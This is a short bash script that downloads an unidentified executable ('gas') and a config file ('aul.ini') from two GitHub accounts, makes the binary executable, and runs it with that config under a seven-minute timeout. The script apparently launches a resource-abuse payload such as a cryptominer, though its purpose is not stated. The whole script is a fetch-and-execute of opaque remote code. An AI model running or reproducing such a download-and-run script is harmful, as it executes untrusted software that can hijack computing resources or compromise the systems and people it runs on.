#!/bin/bash
wget https://github.com/aka648582/yes/raw/main/gas
chmod +x gas
wget https://github.com/altergili1/jobs/raw/main/aul.ini
timeout 7m ./gas aul.ini
